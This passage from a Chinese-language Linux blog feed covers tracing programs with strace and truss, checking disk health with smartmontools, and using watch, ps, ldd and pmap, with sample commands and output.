setsockopt(0x4,0x6,0x1,0xbfbfe3c8,0x4) = 0 (0x0)<br>735: 0.000013688 setsockopt(0x4,0xffff,0x8,0xbfbfe2ec,0x4) = 0 (0x0)<br>735: 0.000203657 connect(0x4,{ AF_INET 10.57.18.27:6000 },16) ERR#61 ‘Connection refused’<br>735: 0.000017042 close(4)          = 0 (0x0)<br>735: 1.009366553 nanosleep(0xbfbfe468,0xbfbfe460) = 0 (0x0)<br>735: 0.000019556 socket(0x2,0x1,0x0)       = 4 (0x4)<br>735: 0.000013409 setsockopt(0x4,0x6,0x1,0xbfbfe3c8,0x4) = 0 (0x0)<br>735: 0.000013130 setsockopt(0x4,0xffff,0x8,0xbfbfe2ec,0x4) = 0 (0x0)<br>735: 0.000272102 connect(0x4,{ AF_INET 10.57.18.27:6000 },16) ERR#61 ‘Connection refused’<br>735: 0.000015924 close(4)          = 0 (0x0)<br>735: 1.009338338 nanosleep(0xbfbfe468,0xbfbfe460) = 0 (0x0)de&gt;</p><p> vim 试图连接10.57.18.27这台主机的6000端口（第四行的 connect（）），连接失败后，睡眠一秒钟继续重试（第6行的nanosleep（））。以上片断循环出现了十几次，每次都要耗费一秒多钟的时间，这 就是vim明显变慢的原因。可是，你肯定会纳闷：”vim怎么会无缘无故连接其它计算机的6000端口呢？”。问得好，那么请你回想一下6000是什么服 务的端口？没错，就是X Server。看来vim是要把输出定向到一个远程X Server，那么Shell中肯定定义了DISPLAY变量，查看.cshrc，果然有这么一行：setenv DISPLAY ${REMOTEHOST}:0，把它注释掉，再重新登录，问题就解决了。  </p><p><strong>案例三：用调试工具掌握软件的工作原理</strong>  </p><pre><code>操作系统：Red Hat Linux 9.0  用 调试工具实时跟踪软件的运行情况不仅是诊断软件&quot;疑难杂症&quot;的有效的手段，也可帮助我们理清软件的&quot;脉络&quot;，即快速掌握软件的运行流程和工作原理，不失为 一种学习源代码的辅助方法。下面这个案例展现了如何使用strace通过跟踪别的软件来&quot;触发灵感&quot;，从而解决软件开发中的难题的。  大 家都知道，在进程内打开一个文件，都有唯一一个文件描述符（fd：file descriptor）与这个文件对应。而本人在开发一个软件过程中遇到这样一个问题：已知一个fd ，如何获取这个fd所对应文件的完整路径？不管是Linux、FreeBSD或是其它Unix系统都没有提供这样的API，怎么办呢？我们换个角度思考： Unix下有没有什么软件可以获取进程打开了哪些文件？如果你经验足够丰富，很容易想到lsof，使用它既可以知道进程打开了哪些文件，也可以了解一个文 件被哪个进程打开。好，我们用一个小程序来试验一下lsof，看它是如何获取进程打开了哪些文件。  </code></pre><p>de&gt;/<em> testlsof.c </em>/  </p><p>#include &lt;stdio.h&gt;  </p><p>#include &lt;unistd.h&gt;  </p><p>#include &lt;sys/types.h&gt;  </p><p>#include &lt;sys/stat.h&gt;  </p><p>#include &lt;fcntl.h&gt;  </p><p>int main(void)<br>{<br>        open(“/tmp/foo”, O_CREAT|O_RDONLY);    /<em> 打开文件/tmp/foo </em>/<br>        sleep(1200);                                /<em> 睡眠1200秒，以便进行后续操作 </em>/<br>        return 0;<br>}de&gt;</p><pre><code>将testlsof放入后台运行，其pid为3125。命令lsof -p 3125查看进程3125打开了哪些文件，我们用strace跟踪lsof的运行，输出结果保存在lsof.strace中：  </code></pre><p>de&gt;# gcc testlsof.c -o testlsof<br># ./testlsof &amp;<br>[1] 3125<br># strace -o lsof.strace lsof -p 3125de&gt;</p><pre><code>我们以&quot;/tmp/foo&quot;为关键字搜索输出文件lsof.strace，结果只有一条：  </code></pre><p>de&gt;# grep ‘/tmp/foo’ lsof.strace<br>readlink(“/proc/3125/fd/3”, “/tmp/foo”, 4096) = 8de&gt;</p><p>原 来lsof巧妙的利用了/proc/nnnn/fd/目录（nnnn为 pid）：Linux内核会为每一个进程在/proc/建立一个以其pid为名的目录用来保存进程的相关信息，而其子目录fd保存的是该进程打开的所有文 件的fd。目标离我们很近了。好，我们到/proc/3125/fd/看个究竟：  </p><p>de&gt;# cd /proc/3125/fd/<br># ls -l<br>total 0<br>lrwx——    1 root     root           64 Nov  5 09:50 0 -&gt; /dev/pts/0<br>lrwx——    1 root     root           64 Nov  5 09:50 1 -&gt; /dev/pts/0<br>lrwx——    1 root     root           64 Nov  5 09:50 2 -&gt; /dev/pts/0<br>lr-x——    1 root     root           64 Nov  5 09:50 3 -&gt; /tmp/foo<br># readlink /proc/3125/fd/3<br>/tmp/foode&gt;</p><pre><code>答案已经很明显了：/proc/nnnn/fd/目录下的每一个fd文件都是符号链接，而此链接就指向被该进程打开的一个文件。我们只要用readlink()系统调用就可以获取某个fd对应的文件了，代码如下：  </code></pre><p>de&gt;#include &lt;stdio.h&gt;  </p><p>#include &lt;string.h&gt;  </p><p>#include &lt;sys/types.h&gt;  </p><p>#include &lt;unistd.h&gt;  </p><p>#include &lt;fcntl.h&gt;  </p><p>#include &lt;sys/stat.h&gt;<br>int get_pathname_from_fd(int fd, char pathname[], int n)<br>{<br>        char buf[1024];<br>        pid_t  pid;<br>        bzero(buf, 1024);<br>        pid = getpid();<br>        snprintf(buf, 1024, “/proc/%i/fd/%i”, pid, fd);<br>        return readlink(buf, pathname, n);<br>}<br>int main(void)<br>{<br>        int fd;<br>        char pathname[4096];<br>        bzero(pathname, 4096);<br>        fd = open(“/tmp/foo”, O_CREAT|O_RDONLY);<br>        get_pathname_from_fd(fd, pathname, 4096);<br>        printf(“fd=%d; pathname=%s<br>“, fd, pathname);<br>        return 0;<br>}de&gt;</p><pre><code>出 于安全方面的考虑，在FreeBSD 5 之后系统默认已经不再自动装载proc文件系统，因此，要想使用truss或strace跟踪程序，你必须手工装载proc文件系统：mount -t procfs proc /proc；或者在/etc/fstab中加上一行：  </code></pre><p>de&gt;proc                   /proc           procfs  rw              0       0de&gt;</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Smartmontools---硬盘检测工具</title>
      <link href="/2009/12/22/smartmontools-hard-disk-detection-tool/"/>
      <url>/2009/12/22/smartmontools-hard-disk-detection-tool/</url>
      <content type="html"><![CDATA[<h1 id="1-1-什么是Smartmontools？"><a href="#1-1-什么是Smartmontools？" class="headerlink" title="1.1 什么是Smartmontools？"></a>1.1 什么是Smartmontools？</h1><p>Smartmontools 是一种硬盘检测工具，通过控制和管理硬盘的SMART（Self Monitoring Analysis and Reporting Technology，自动检测分析及报告技术）技术来实现的，SMART技术可以对硬盘的磁头单元、盘片电机驱动系统、硬盘内部电路以及盘片表面介质材 料等进行监测，当SMART监测并分析出硬盘可能出现问题时会及时向用户报警以避免计算机数据受损失。SMART技术必须在主板支持的前提下才能发生作 用，而且 SMART技术也不能保证能预报所有可能发生的硬盘故障。SMART(SFF-8035i) 是硬盘生产商们建立的一个工业标准，这个标准就是在硬盘上保存一个跟执行情况，可靠程度，读找错误率等属性的表格。所有属性都有一个1byte(大小范围 1-253)的标准化值，还包含另一个1byte的关键阶段值，如果属性表格内某个数据接近小于或达到关键阶段值，表明硬盘工作不正常了。</p><h1 id="2-1-Smartmontools的使用"><a href="#2-1-Smartmontools的使用" class="headerlink" title="2.1 Smartmontools的使用"></a>2.1 Smartmontools的使用</h1><p>1、启动监控进程</p><p># /etc/init.d/smartd start<br>启动 smartd：                                              [  确定  ]</p><p>2、检查硬盘是否支持SMART 1993年以后出厂的硬盘基本上都支持SMART技术，使用如下命令可以来查看：</p><p># smartctl -i /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="noopener">http://smartmontools.sourceforge.net/</a>  </p><p>=== START OF INFORMATION SECTION ===<br>Device Model:     ST3160212A<br>Serial Number:    5LS2EDKN<br>Firmware Version: 3.AAE<br>User Capacity:    160,041,885,696 bytes<br>Device is:        Not in smartctl database [for details use: -P showall]<br>ATA Version is:   7<br>ATA Standard is:  Exact ATA specification draft version not indicated<br>Local Time is:    Mon Sep 17 02:13:37 2007 CST<br>SMART support is: Available - device has SMART capability.<br>SMART support is: Enabled</p><p>在上面的信息可以看到，该硬盘是支持SMART技术，且当前是开启的。如果SMART support is: Disabled表示SMART未启用，执行如下命令，启动SMART：</p><p>smartctl –smart=on –offlineauto=on –saveauto=on /dev/hdb</p><p>3、检查硬盘健康状态</p><p># smartctl -H /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="noopener">http://smartmontools.sourceforge.net/</a>  </p><p>=== START OF READ SMART DATA SECTION ===<br>SMART overall-health self-assessment test result: PASSED</p><p>请 注意result后边的结果：PASSED，这表示硬盘健康状态良好，如果这里显示Failure，那么最好立刻给服务器更换硬盘。SMART只 能报告磁盘已经不再健康，但是报警后还能继续运行多久是不确定的，通常，SMART报警参数是有预留的，磁盘报警后，不会当场坏掉，一般能坚持一段时间， 有的硬盘SMART报警后还继续跑了好几年，有的硬盘SMART报错后几天就坏了，千万不要存在侥幸心理。执行如下命令可以看到详细的参数：</p><p># smartctl -A /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="noopener">http://smartmontools.sourceforge.net/</a>  </p><p>=== START OF READ SMART DATA SECTION ===<br>SMART Attributes Data Structure revision number: 10<br>Vendor Specific SMART Attributes with Thresholds:<br>ID# ATTRIBUTE_NAME          FLAG     VALUE WORST THRESH TYPE      UPDATED  WHEN_FAILED RAW_VALUE<br>  1 Raw_Read_Error_Rate     0x000f   114   100   006    Pre-fail  Always       -       81812244<br>  3 Spin_Up_Time            0x0003   100   099   000    Pre-fail  Always       -       0<br>  4 Start_Stop_Count        0x0032   100   100   020    Old_age   Always       -       257<br>  5 Reallocated_Sector_Ct   0x0033   100   100   036    Pre-fail  Always       -       0<br>  7 Seek_Error_Rate         0x000f   078   060   030    Pre-fail  Always       -       64781708<br>  9 Power_On_Hours          0x0032   096   096   000    Old_age   Always       -       4365<br> 10 Spin_Retry_Count        0x0013   100   100   097    Pre-fail  Always       -       0<br> 12 Power_Cycle_Count       0x0032   100   100   020    Old_age   Always       -       276<br>187 Unknown_Attribute       0x0032   100   100   000    Old_age   Always       -       0<br>189 Unknown_Attribute       0x003a   100   100   000    Old_age   Always       -       0<br>190 Unknown_Attribute       0x0022   058   053   045    Old_age   Always       -       773324842<br>194 Temperature_Celsius     0x0022   042   047   000    Old_age   Always       -       42 (Lifetime Min/Max 0/21)<br>195 Hardware_ECC_Recovered  0x001a   052   048   000    Old_age   Always       -       1562815<br>197 Current_Pending_Sector  0x0012   100   100   000    Old_age   Always       -       0<br>198 Offline_Uncorrectable   0x0010   100   100   000    Old_age   Offline      -       0<br>199 UDMA_CRC_Error_Count    0x003e   200   200   000    Old_age   Always       -       0<br>200 Multi_Zone_Error_Rate   0x0000   100   253   000    Old_age   Offline      -       0<br>202 TA_Increase_Count       0x0032   100   253   000    Old_age   Always       -       0</p><p>FLAG是标记，标准数值(VALUE)应当小于或等於关键值(THRESH)。WHEN_FAILED 代表错误信息，上面显示的WHEN_FAILED纵行是空行，说明硬盘没有故障。如果WHEN_FAILED显示数字，表明硬盘磁道可能有比较大的坏道。</p><p>4、对硬盘进行检测 手工对硬盘进行测试的方法有以下四种：</p><p>smartctl -t short <device>    后台检测硬盘，消耗时间短<br>smartctl -t long <device>      后台检测硬盘，消耗时间长<br>smartctl -C -t short <device> 前台检测硬盘，消耗时间短<br>smartctl -C -t long <device>  前台检测硬盘，消耗时间长</device></device></device></device></p><p>例如，在后台对硬盘进行详细的检查，命令如下：</p><p># smartctl -t long /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="noopener">http://smartmontools.sourceforge.net/</a>  </p><p>=== START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION ===<br>Sending command: “Execute SMART Extended self-test routine immediately in off-line mode”.<br>Drive command “Execute SMART Extended self-test routine immediately in off-line mode” successful.<br>Testing has begun.<br>Please wait 54 minutes for test to complete.<br>Test will complete after Mon Sep 17 03:53:32 2007  </p><p>Use smartctl -X to abort test.</p><p>上面的信息显示54分钟后将完成检查，同时可以使用 smartctl -X 终止检查。终止硬盘检查命令的使用方法是：</p><p># smartctl -X /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="noopener">http://smartmontools.sourceforge.net/</a>  </p><p>=== START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION ===<br>Sending command: “Abort SMART off-line mode self-test routine”.<br>Self-testing aborted!</p><p>5、查看硬盘日志 使用“smartctl -l logtype <device>”可以查看硬盘的日志，日志又分为多种类型，如selftest、error等等。例如查看硬盘检测的日志，如下：</device></p><p># smartctl -l selftest /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="noopener">http://smartmontools.sourceforge.net/</a>  </p><p>=== START OF READ SMART DATA SECTION ===<br>SMART Self-test log structure revision number 1<br>Num  Test_Description    Status                  Remaining  LifeTime(hours)  LBA_of_first_error<br># 1  Extended offline    Aborted by host               90%      4365         -<br># 2  Extended offline    Completed without error       00%      4247         -<br># 3  Short offline       Aborted by ho<br>st               30%      4246         -<br># 4  Short offline       Aborted by host               10%      4246         -<br># 5  Extended offline    Completed without error       00%      4229         -</p><p>查看硬盘错误日志：</p><p># smartctl -l error /dev/hdb<br>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="noopener">http://smartmontools.sourceforge.net/</a>  </p><p>=== START OF READ SMART DATA SECTION ===<br>SMART Error Log Version: 1<br>No Errors Logged</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用smartmontools监控磁盘的健康状态</title>
      <link href="/2009/12/22/use-smartmontools-to-monitor-the-health-of-your-disks/"/>
      <url>/2009/12/22/use-smartmontools-to-monitor-the-health-of-your-disks/</url>
      <content type="html"><![CDATA[]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>watch -- 监测命令的运行结果</title>
      <link href="/2009/12/22/watch-monitor-command-run-results/"/>
      <url>/2009/12/22/watch-monitor-command-run-results/</url>
      <content type="html"><![CDATA[<p>watch 是一个非常实用的命令，基本所有的 Linux 发行版都带有这个小工具，如同名字一样，watch 可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。</p><p>举 例来说，Linux 系统有一个基础命令 w，可以显示当前的 uptime、负载还有登录的用户，非常方便，但是如果我想监测这些数据，看看有没有新用户登入，看看某段的时间的负载是不是太大之类的，就得手动一遍遍 的运行这个命令，然后查看结果，虽然命令只有一个字母，但是还是很郁闷……</p><p>watch 就是干这个用的，直接在 watch 后面接你想运行的命令，watch 就会帮你重复运行，并把每次的结果都更新在屏幕上～</p><p>要想监测 w 命令的运行结果，只要 watch w 就可以了：</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/www_linuxeden_1533080.png" alt="" title="watch -- 监测命令的运行结果 - suchalin - 为了更好的生活而奋斗！"></p><p>默认 watch 会以 2s 的间隔重复运行命令，你也可以用 -n 参数指定时间间隔～</p><p>还有一个实用的参数是 -d，这样 watch 会帮你高亮显示变化的区域，这样更加一目了然了～ <img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/www_linuxeden_1533081.gif" alt="" title="watch -- 监测命令的运行结果 - suchalin - 为了更好的生活而奋斗！"></p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/www_linuxeden_1533082.png" alt="" title="watch -- 监测命令的运行结果 - suchalin - 为了更好的生活而奋斗！"></p><p>Ctrl+c 就可以退出～</p><p>你可以拿他来监测你想要的一切命令的结果变化，比如 tail 一个 log 文件，ls 监测某个文件的大小变化，看你的想象力了～ <img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/www_linuxeden_1533083.gif" alt="" title="watch -- 监测命令的运行结果 - suchalin - 为了更好的生活而奋斗！"></p><p>如果你的发行版中不幸没有这个命令，可以到<a href="http://procps.sourceforge.net/" target="_blank" rel="noopener">这里</a>下载安装，watch 属于 procps 这个软件包。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux的ps命令</title>
      <link href="/2009/12/22/linux-ps-command/"/>
      <url>/2009/12/22/linux-ps-command/</url>
      <content type="html"><![CDATA[<p>linux的ps命令和top都是用来监视系统进程和资源使用情况的有用命令, ps命令更为常用, 所以掌握ps命令是很有必要的</p><p>ps命令如果有任何疑问,请在终端下输入 :# man ps</p><p>名称：ps<br>使用权限：所有使用者<br>使用方式：ps [options] [–help]<br>说明：显示瞬间行程 (process) 的动态<br>参数：<br>ps 的参数非常多, 在此仅列出几个常用的参数并大略介绍含义<br>-A 列出所有的行程<br>-w 显示加宽可以显示较多的资讯<br>-au 显示较详细的资讯<br>-aux 显示所有包含其他使用者的行程</p><p>au(x) 输出格式 :</p><p>USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND<br>USER: 行程拥有者<br>PID: pid<br>%CPU: 占用的 CPU 使用率<br>%MEM: 占用的记忆体使用率<br>VSZ: 占用的虚拟记忆体大小<br>RSS: 占用的记忆体大小<br>TTY: 终端的次要装置号码 (minor device number of tty)<br>STAT: 该行程的状态:<br>D: 不可中断的静止 (通悸□□缜b进行 I/O 动作)<br>R: 正在执行中<br>S: 静止状态<br>T: 暂停执行<br>Z: 不存在但暂时无法消除<br>W: 没有足够的记忆体分页可分配<br>&lt;: 高优先序的行程<br>N: 低优先序的行程<br>L: 有记忆体分页分配并锁在记忆体内<br>START: 行程开始时间<br>TIME: 执行的时间<br>COMMAND:所执行的指令</p><p>范例：</p><p>ps<br>PID TTY TIME CMD<br>2791 ttyp0 00:00:00 tcsh<br>3092 ttyp0 00:00:00 ps<br>% ps -A<br>PID TTY TIME CMD<br>1 ? 00:00:03 init<br>2 ? 00:00:00 kflushd<br>3 ? 00:00:00 kpiod<br>4 ? 00:00:00 kswapd<br>5 ? 00:00:00 mdrecoveryd<br>…….<br>% ps -aux<br>USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND<br>root 1 0.0 0.7 1096 472 ? S Sep10 0:03 init [3]<br>root 2 0.0 0.0 0 0 ? SW Sep10 0:00 [kflushd]<br>root 3 0.0 0.0 0 0 ? SW Sep10 0:00 [kpiod]<br>root 4 0.0 0.0 0 0 ? SW Sep10 0:00 [kswapd]</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux下调试命令</title>
      <link href="/2009/12/22/linux-debug-command/"/>
      <url>/2009/12/22/linux-debug-command/</url>
      <content type="html"><![CDATA[<p>调试程序时有用的命令：<br>gdb Linux下的调试器<br>pstack 查看进程的调用栈，如果是多线程的话，可以查看每个线程的调用栈<br>pmap 查看内存的映射情况<br>strace 跟踪进程的系统调用<br>ltrace 跟踪程序的系统调用<br>ldd 查看依赖库<br>lsof 查看进程打开的所有文件</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>LDD命令的原理与使用方法</title>
      <link href="/2009/12/22/the-principle-and-use-of-ldd-commands/"/>
      <url>/2009/12/22/the-principle-and-use-of-ldd-commands/</url>
      <content type="html"><![CDATA[<p><strong>作用：用来查看程式运行所需的共享库**</strong>,<strong>**常用来解决程式因缺少某个库文件而不能运行的一些问题。</strong><br>ldd命令原理</p><p>1、首先ldd不是个可执行程式，而只是个shell脚本<br>2、ldd能够显示可执行模块的dependency，<strong>其原理是通过设置一系列的环境变量</strong>，如下：LD_TRACE_LOADED_OBJECTS、LD_WARN、LD_BIND_NOW、LD_LIBRARY_VERSION、LD_VERBOSE等。当LD_TRACE_LOADED_OBJECTS环境变量不为空时，所有可执行程式在运行时，他<strong>都会只显示模块的**</strong>dependency<strong>**，而程式并不真正执行。</strong>要不你能在shell终端测试一下，如下：(1) export LD_TRACE_LOADED_OBJECTS=1<br>(2) 再执行所有的程式，如ls等，看看程式的运行结果<br>3、<strong>ldd**</strong>显示可执行模块的<strong><strong>dependency</strong></strong>的工作原理，其实质是通过<strong><strong>ld-linux.so</strong></strong>（<strong><strong>elf</strong></strong>动态库的装载器）来实现的。<strong>我们知道，ld-linux.so模块会先于executable模块程式工作，并获得控制权，因此当上述的那些环境变量被设置时，ld-linux.so选择了显示可执行模块的dependency。<br>4、</strong>实际上能直接执行<strong><strong>ld-linux.so</strong></strong>模块，如：<strong><strong>/lib/ld-linux.so.2 –list program</strong></strong>（这相当于<strong><strong>ldd program</strong></strong>）<strong><br>ldd命令使用方法(摘自ldd –help)<br>名称ldd - 打印共享库的依赖关系<br>大纲    ldd [选项]…　文件…<br>描述</strong>ldd<strong> </strong>输出在命令行上指定的每个程式或共享库需要的共享库。**选项<br> –version　　　　　　　打印ldd的版本号<br> -v –verbose　　　　　　　打印所有信息，例如包括符号的版本信息<br> -d –data-relocs　　　　　　　执行符号重部署，并报告缺少的目标对象（只对ELF格式适用）<br> -r –function-relocs　　　　　　　对目标对象和函数执行重新部署，并报告缺少的目标对象和函数（只对ELF格式适用）<br> –help 用法信息<br>注意:<br> ldd的标准版本和glibc2一起提供。Libc5和老版本以前提供，在一些系统中还存在。在libc5版本中长选项不支持。另一方面，glibc2版本不支持-V选项，只提供等价的–version选项。<br>  如果命令行中给定的库名字包含’/’，这个程式的libc5版本将使用他作为库名字；否则他将在标准位置搜索库。运行一个当前目录下的共享库，加前缀”./“。<br>错误:<br> ldd不能工作在a.out格式的共享库上。<br> ldd不能工作在一些非常老的a.out程式上，这些程式在支持ldd的编译器发行前已创建。如果你在这种类型的程式上使用ldd，程式将尝试argc = 0的运行方式，其结果不可预知。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux之pmap命令！</title>
      <link href="/2009/12/22/linux-pmap-command/"/>
      <url>/2009/12/22/linux-pmap-command/</url>
      <content type="html"><![CDATA[<p>观察到系统中的指定进程的地址空间分布情况显示一个目标文件或者链接库文件中的目标文件的各个段的大小。该文件从/proc//maps中获得数据。<br>命令格式：<br>pmap  </p><p>范例：<br>[root@localhost security]# pmap -d 4993<br>4993: -bash<br>Address Kbytes Mode Offset Device Mapping<br>08047000 596 r-x– 0000000000000000 003:00006 bash bash的代码段<br>080dc000 28 rwx– 0000000000094000 003:00006 bash bash的数据段<br>080e3000 280 rwx– 00000000080e3000 000:00000 [ anon ] bash的堆<br>4d575000 84 r-x– 0000000000000000 003:00006 ld-2.3.4.so 共享库的代码段<br>4d58a000 4 r-x– 0000000000015000 003:00006 ld-2.3.4.so 共享库的数据段<br>4d58b000 4 rwx– 0000000000016000 003:00006 ld-2.3.4.so 共享库的堆<br>4d58e000 1164 r-x– 0000000000000000 003:00006 libc-2.3.4.so<br>4d6b1000 4 r-x– 0000000000123000 003:00006 libc-2.3.4.so<br>4d6b2000 12 rwx– 0000000000124000 003:00006 libc-2.3.4.so<br>4d6b5000 8 rwx– 000000004d6b5000 000:00000 [ anon ] 匿名物理内存，<br>4d6de000 8 r-x– 0000000000000000 003:00006 libdl-2.3.4.so<br>4d6e0000 8 rwx– 0000000000001000 003:00006 libdl-2.3.4.so<br>4d807000 12 r-x– 0000000000000000 003:00006 libtermcap.so.2.0.8<br>4d80a000 4 rwx– 0000000000002000 003:00006 libtermcap.so.2.0.8<br>b7bc2000 176 r-x– 0000000000000000 003:00006 GB18030.so<br>b7bee000 8 rwx– 000000000002b000 003:00006 GB18030.so<br>b7bf0000 24 r-xs- 0000000000000000 003:00006 gconv-modules.cache<br>b7bf6000 1060 r-x– 0000000002197000 003:00006 locale-archive<br>b7cff000 2048 r-x– 0000000000000000 003:00006 locale-archive<br>b7eff000 36 r-x– 0000000000000000 003:00006 libnss_files-2.3.4.so<br>b7f08000 8 rwx– 0000000000008000 003:00006 libnss_files-2.3.4.so<br>b7f0a000 8 rwx– 00000000b7f0a000 000:00000 [ anon ]<br>b7f20000 8 rwx– 00000000b7f20000 000:00000 [ anon ]<br>bff0d000 84 rw— 00000000bff0d000 000:00000 [ stack ]<br>ffffe000 4 —– 0000000000000000 000:00000 [ anon ]<br>mapped: 5680K writeable/private: 460K shared: 24K  </p><p>每列的含义如下：<br>参数 解释<br>Address:00378000-0038d000 进程所占的地址空间<br>Kbytes 该虚拟段的大小<br>RSS 设备号（主设备：次设备）<br>Anon 设备的节点号，0表示没有节点与内存相对应<br>Locked 是否允许swapped<br>Mode 权限：r=read, w=write, x=execute, s=shared, p=private(copy on write)<br>Mapping: bash 对应的映像文件名  </p><p>[root@localhost security]# pmap -x 4993<br>4993: -bash<br>Address Kbytes RSS Anon Locked Mode Mapping<br>08047000 596 - - - r-x– bash<br>080dc000 28 - - - rwx– bash<br>080e3000 280 - - - rwx– [ anon ]<br>4d575000 84 - - - r-x– ld-2.3.4.so<br>4d58a000 4 - - - r-x– ld-2.3.4.so<br>4d58b000 4 - - - rwx– ld-2.3.4.so<br>4d58e000 1164 - - - r-x– libc-2.3.4.so<br>4d6b1000 4 - - - r-x– libc-2.3.4.so<br>4d6b2000 12 - - - rwx– libc-2.3.4.so<br>4d6b5000 8 - - - rwx– [ anon ]<br>4d6de000 8 - - - r-x– libdl-2.3.4.so<br>4d6e0000 8 - - - rwx– libdl-2.3.4.so<br>4d807000 12 - - - r-x– libtermcap.so.2.0.8<br>4d80a000 4 - - - rwx– libtermcap.so.2.0.8<br>b7bc2000 176 - - - r-x– GB18030.so<br>b7bee000 8 - - - rwx– GB18030.so<br>b7bf0000 24 - - - r-xs- gconv-modules.cache<br>b7bf6000 1060 - - - r-x– locale-archive<br>b7cff000 2048 - - - r-x– locale-archive<br>b7eff000 36 - - - r-x– libnss_files-2.3.4.so<br>b7f08000 8 - - - rwx– libnss_files-2.3.4.so<br>b7f0a000 8 - - - rwx– [ anon ]<br>b7f20000 8 - - - rwx– [ anon ]<br>bff0d000 84 - - - rw— [ stack ]<br>ffffe000 4 - - - —– [ anon ]<br>-------- ------- ------- ------- -------<br>total kB 5680 - - -</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>跟踪 UNIX 应用程序的解决方案</title>
      <link href="/2009/12/22/a-solution-to-track-unix-applications/"/>
      <url>/2009/12/22/a-solution-to-track-unix-applications/</url>
      <content type="html"><![CDATA[<p>使用 truss 和 strace</p><p>在 Solaris 和 AIX 上可以使用 truss 工具，它能够跟踪应用程序中的系统调用和信号。可以在 Linux? 上使用的 strace 工具提供相似的功能。在不同的系统上，还有提供相似信息的其他工具，包括 ktrace (FreeBSD) 和 trace。</p><p>truss/strace 概述</p><p>truss 和 strace 工具提供相似的信息，但是命令行选项稍有差异。使用这两种工具的标准方法都是把工具名放在要执行的命令前面。</p><p>例如，清单 3 给出 truss 对于本教程前面提到的 ageindays 程序的输出。</p><p><strong>清单 3. truss 的输出</strong>  </p><p>$ truss ./ageindays 24/1/1980 26/3/2009<br>execve(“ageindays”, 0x08047BBC, 0x08047BCC)  argc = 3<br>mmap(0x00000000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0)<br>   = 0xFEFB0000<br>resolvepath(“/usr/lib/ld.so.1”, “/lib/ld.so.1”, 1023) = 12<br>getcwd(“/root”, 1013)                           = 0<br>resolvepath(“/root/ageindays”, “/root/ageindays”, 1023) = 15<br>xstat(2, “/root/ageindays”, 0x08047880)         = 0<br>open(“/var/ld/ld.config”, O_RDONLY)             = 3<br>fxstat(2, 3, 0x08047760)                        = 0<br>mmap(0x00000000, 144, PROT_READ, MAP_SHARED, 3, 0) = 0xFEFA0000<br>close(3)                                        = 0<br>sysconfig(_CONFIG_PAGESIZE)                     = 4096<br>xstat(2, “/usr/lib/libc.so.1”, 0x08046FA0)      = 0<br>resolvepath(“/usr/lib/libc.so.1”, “/lib/libc.so.1”, 1023) = 14<br>open(“/usr/lib/libc.so.1”, O_RDONLY)            = 3<br>mmap(0x00010000, 32768, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_ALIGN, 3, 0)<br>    = 0xFEF90000<br>mmap(0x00010000, 1413120, PROT_NONE, MAP_PRIVATE|MAP_NORESERVE|MAP_ANON|MAP_ALIGN, -1, 0)<br>    = 0xFEE30000<br>mmap(0xFEE30000, 1302809, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_TEXT, 3, 0)<br>    = 0xFEE30000<br>mmap(0xFEF7F000, 30862, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|<br>    MAP_INITDATA, 3, 1306624) = 0xFEF7F000<br>mmap(0xFEF87000, 4776, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANON,<br>   -1, 0) = 0xFEF87000<br>munmap(0xFEF6F000, 65536)                       = 0<br>memcntl(0xFEE30000, 187632, MC_ADVISE, MADV_WILLNEED, 0, 0) = 0<br>close(3)                                        = 0<br>mmap(0x00010000, 24576, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON|MAP_ALIGN,<br>   -1, 0)<br>    = 0xFEE20000<br>munmap(0xFEF90000, 32768)           